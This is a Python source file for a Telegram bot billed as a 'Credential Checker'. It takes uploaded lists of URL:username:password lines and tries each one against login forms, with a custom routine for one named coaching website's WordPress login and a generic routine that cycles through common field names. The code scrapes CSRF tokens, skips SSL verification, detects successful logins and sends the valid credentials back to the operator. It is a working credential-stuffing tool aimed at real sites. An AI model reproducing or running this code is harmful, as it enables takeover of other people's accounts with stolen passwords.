import os
import sys
import logging
import threading
import aiohttp
import asyncio
import re
import json
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs

# Fix for Pyrogram on Python 3.14+
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message
from config import API_ID, API_HASH, BOT_TOKEN, ADMINS

# --- Configuration ---
ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

def is_admin(user_id):
    if not ALLOWED_USERS:
        return False
    return user_id in ALLOWED_USERS

# --- Flask Health Server ---
flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "Bot is running and healthy.", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# --- Credential Parser ---
def parse_credential_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    parts = line.split(':')
    if len(parts) < 3:
        return None
    
    url = parts[0]
    password = ':'.join(parts[2:])
    username = ':'.join(parts[1:-1])
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    return (url, username, password)

# --- Get Login Page Info First ---
async def get_login_page_info(session, login_url):
    """Fetch login page to extract form details, CSRF tokens, etc."""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        
        async with session.get(login_url, headers=headers, timeout=15, ssl=False) as response:
            text = await response.text()
            
            # Extract form action URL
            form_action = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', text, re.IGNORECASE)
            if form_action:
                action_url = form_action.group(1)
                if action_url.startswith('/'):
                    parsed = urlparse(str(response.url))
                    action_url = f"{parsed.scheme}://{parsed.netloc}{action_url}"
                elif not action_url.startswith('http'):
                    action_url = urljoin(str(response.url), action_url)
            else:
                action_url = str(response.url)
            
            # Look for CSRF token
            csrf_token = None
            csrf_patterns = [
                r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
                r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
                r'name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']',
                r'value=["\']([^"\']+)["\'][^>]*name=["\']_token["\']',
            ]
            for pattern in csrf_patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    csrf_token = match.group(1)
                    break
            
            # Check for WordPress
            is_wordpress = 'wp-' in text.lower() or 'wordpress' in text.lower()
            
            # Get cookies
            cookies = response.cookies
            
            return {
                'action_url': action_url,
                'csrf_token': csrf_token,
                'is_wordpress': is_wordpress,
                'cookies': cookies,
                'original_url': str(response.url)
            }
            
    except Exception as e:
        logger.error(f"Error getting login page: {e}")
        return None

# --- Check Specific Site: coaching.miteshkhatri.com ---
async def check_mitesh_khatri(session, email, password, login_info=None):
    """
    Custom checker for coaching.miteshkhatri.com
    Based on HTML: WordPress site with Email/Password fields
    """
    
    login_url = "https://coaching.miteshkhatri.com/login"
    
    # Get login page first if not provided
    if not login_info:
        login_info = await get_login_page_info(session, login_url)
        if not login_info:
            return (False, "Could not fetch login page")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://coaching.miteshkhatri.com',
        'Referer': 'https://coaching.miteshkhatri.com/login',
    }
    
    # WordPress login payload
    payload = {
        'log': email,  # WordPress uses 'log' for username/email
        'pwd': password,  # WordPress uses 'pwd' for password
        'rememberme': 'forever',
        'wp-submit': 'Log In',
        'redirect_to': 'https://coaching.miteshkhatri.com/wp-admin/',
        'testcookie': '1'
    }
    
    # Add CSRF if found
    if login_info.get('csrf_token'):
        payload['_token'] = login_info['csrf_token']
    
    try:
        async with session.post(
            login_info['action_url'],
            data=payload,
            headers=headers,
            allow_redirects=True,
            timeout=20,
            ssl=False
        ) as response:
            
            final_url = str(response.url)
            text = await response.text()
            text_lower = text.lower()
            
            # Get all cookies
            cookies = response.cookies
            cookie_str = str(cookies)
            
            debug_info = {
                'status': response.status,
                'final_url': final_url,
                'has_wordpress_logged_in_cookie': 'wordpress_logged_in' in cookie_str,
                'has_wp_settings_cookie': 'wp-settings' in cookie_str,
                'cookies_received': list(cookies.keys()) if cookies else [],
                'content_preview': text[:500]
            }
            
            # === SUCCESS INDICATORS for WordPress ===
            
            # 1. WordPress logged_in cookie (STRONGEST indicator)
            if 'wordpress_logged_in' in cookie_str:
                return (True, {**debug_info, 'reason': 'WordPress logged_in cookie found'})
            
            # 2. Redirected to wp-admin or dashboard
            if '/wp-admin' in final_url or '/dashboard' in final_url:
                if 'wp-login.php' not in final_url:
                    return (True, {**debug_info, 'reason': 'Redirected to admin area'})
            
            # 3. Contains logout link (user is logged in)
            if any(x in text_lower for x in ['logout', 'log out', 'sign out', 'wp-logout']):
                if 'login' not in final_url.lower() or final_url.count('/') > 3:
                    return (True, {**debug_info, 'reason': 'Logout link found'})
            
            # 4. Profile/dashboard content
            if any(x in text_lower for x in ['my account', 'profile', 'dashboard', 'welcome']) and \
               'error' not in text_lower and 'incorrect' not in text_lower:
                return (True, {**debug_info, 'reason': 'Dashboard content found'})
            
            # === FAILURE INDICATORS ===
            
            failure_signs = [
                'incorrect password' in text_lower,
                'invalid username' in text_lower,
                'invalid email' in text_lower,
                'unknown email' in text_lower,
                'login failed' in text_lower,
                'authentication failed' in text_lower,
                'error' in text_lower and 'login' in text_lower,
                'the password you entered' in text_lower,
                'is incorrect' in text_lower,
                'lost your password' in text_lower and 'error' in text_lower,
                response.status == 403,
                'wp-login.php' in final_url and 'redirect_to' not in final_url,
                'shake' in text_lower and 'login' in text_lower,  # WordPress shake animation on error
            ]
            
            if any(failure_signs):
                return (False, {**debug_info, 'reason': 'Login failure indicators found'})
            
            # === AMBIGUOUS - Need more checks ===
            
            # If still on login page
            if 'wp-login.php' in final_url or '/login' in final_url:
                # Check if there's an error message div
                if re.search(r'class=["\'][^"\']*error[^"\']*["\']', text, re.IGNORECASE):
                    return (False, {**debug_info, 'reason': 'Error class found on login page'})
                
                # Check for WordPress login form still present
                if 'id="loginform"' in text_lower or 'name="loginform"' in text_lower:
                    return (False, {**debug_info, 'reason': 'Login form still present'})
            
            return (False, {**debug_info, 'reason': 'Could not determine login status'})
            
    except Exception as e:
        return (False, {'error': str(e)})

# --- Generic Checker for Other Sites ---
async def check_generic_site(session, url, username, password):
    """Generic checker for non-specific sites"""
    
    login_info = await get_login_page_info(session, url)
    if not login_info:
        return (False, "Could not fetch login page")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Referer': login_info['original_url'],
    }
    
    # Try multiple field combinations
    field_combos = [
        {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': login_info['original_url'].rstrip('/') + '/wp-admin/'},
        {'email': username, 'password': password},
        {'username': username, 'password': password},
        {'user': username, 'pass': password},
        {'login': username, 'password': password},
    ]
    
    for payload in field_combos:
        try:
            async with session.post(
                login_info['action_url'],
                data=payload,
                headers=headers,
                allow_redirects=True,
                timeout=15,
                ssl=False
            ) as response:
                
                final_url = str(response.url)
                text = await response.text()
                text_lower = text.lower()
                cookies = str(response.cookies)
                
                # Success checks
                success = (
                    'wordpress_logged_in' in cookies or
                    ('/wp-admin' in final_url and 'wp-login' not in final_url) or
                    ('logout' in text_lower and 'login' not in final_url.lower()) or
                    ('dashboard' in text_lower and 'error' not in text_lower)
                )
                
                # Failure checks
                failure = (
                    'incorrect' in text_lower or
                    'invalid' in text_lower or
                    'error' in text_lower and 'login' in text_lower or
                    'wp-login.php' in final_url
                )
                
                if success and not failure:
                    return (True, {'method': 'generic', 'final_url': final_url})
                
                if failure:
                    return (False, {'method': 'generic', 'reason': 'Failure indicators found'})
                    
        except Exception:
            continue
    
    return (False, "All generic methods failed")

# --- Main Checker Router ---
async def check_credential(session, url, username, password):
    """Route to appropriate checker based on URL"""
    
    url_lower = url.lower()
    
    # Site-specific checkers
    if 'coaching.miteshkhatri.com' in url_lower or 'miteshkhatri.com' in url_lower:
        return await check_mitesh_khatri(session, username, password)
    
    # Generic checker for other sites
    return await check_generic_site(session, url, username, password)

# --- Process Credentials ---
async def process_credentials(client: Client, message: Message, file_path: str):
    chat_id = message.chat.id
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        await message.reply_text(f"❌ Error reading file: {str(e)}")
        return
    
    credentials = []
    for line_num, line in enumerate(lines, 1):
        parsed = parse_credential_line(line)
        if parsed:
            credentials.append((line_num, parsed[0], parsed[1], parsed[2]))
    
    total = len(credentials)
    
    if total == 0:
        await message.reply_text("❌ No valid credentials found.\nFormat: URL:username:password")
        return
    
    await message.reply_text(f"🔍 Found {total} credentials. Starting check...")
    
    valid_results = []
    invalid_results = []
    checked = 0
    
    connector = aiohttp.TCPConnector(limit=20, limit_per_host=3, ssl=False)
    timeout = aiohttp.ClientTimeout(total=25)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        
        for line_num, url, username, password in credentials:
            is_valid, debug_info = await check_credential(session, url, username, password)
            
            log_entry = f"{url}:{username}:{password}"
            
            if is_valid:
                valid_results.append(log_entry)
                logger.info(f"✅ VALID: {url} | {username}")
            else:
                # Save debug info for invalid
                debug_str = json.dumps(debug_info, default=str)[:200]
                invalid_results.append(f"{log_entry} | {debug_str}")
                logger.info(f"❌ INVALID: {url} | {username}")
            
            checked += 1
            
            # Progress every 5 items or 10%
            if checked % 5 == 0 or checked == total:
                await message.reply_text(
                    f"⏳ Checked: {checked}/{total} ({int(checked/total*100)}%)\n"
                    f"✅ Valid: {len(valid_results)} | ❌ Invalid: {len(invalid_results)}"
                )
            
            await asyncio.sleep(1.5)  # Delay to be respectful
    
    # Final results
    summary = (
        f"✅ **Complete!**\n\n"
        f"📊 Total: {total}\n"
        f"✅ Valid: {len(valid_results)}\n"
        f"❌ Invalid: {len(invalid_results)}"
    )
    await message.reply_text(summary)
    
    # Send valid file
    if valid_results:
        result_file = f"VALID_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(result_file, 'w') as f:
            f.write('\n'.join(valid_results))
        
        await message.reply_document(result_file, caption=f"✅ {len(valid_results)} Valid Credentials")
        os.remove(result_file)
    
    # Send debug file for invalid (first 30)
    if invalid_results:
        debug_file = f"DEBUG_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(debug_file, 'w') as f:
            f.write('\n'.join(invalid_results[:30]))
        
        await message.reply_document(debug_file, caption=f"🐛 Debug info (first 30 invalid)")
        os.remove(debug_file)
    
    os.remove(file_path)

# --- Bot Handlers ---
app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start_handler(client, message: Message):
    if not is_admin(message.from_user.id):
        return

    await message.reply_text(
        "👨‍💻 **Credential Checker Bot v3**\n\n"
        "**Supported Sites:**\n"
        "✅ coaching.miteshkhatri.com (WordPress)\n"
        "✅ Generic WordPress sites\n"
        "✅ Other sites (basic detection)\n\n"
        "**Format:**\n"
        "`URL:email:password`\n\n"
        "**Example:**\n"
        "`https://coaching.miteshkhatri.com/login:test@email.com:mypass123`"
    )

@app.on_message(filters.document)
async def handle_document(client, message: Message):
    if not is_admin(message.from_user.id):
        return
    
    if not message.document.file_name.endswith('.txt'):
        await message.reply_text("❌ Send `.txt` file only.")
        return
    
    try:
        file_path = await message.download()
    except Exception as e:
        await message.reply_text(f"❌ Download failed: {str(e)}")
        return
    
    await message.reply_text("📥 File received. Checking...")
    await process_credentials(client, message, file_path)

@app.on_message(filters.private & ~filters.document & ~filters.command("start"))
async def private_handler(client, message: Message):
    if not is_admin(message.from_user.id):
        return
    await message.reply_text("Send a `.txt` file or use /start")

# --- Main ---
if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    logger.info("Bot starting...")
    app.run()
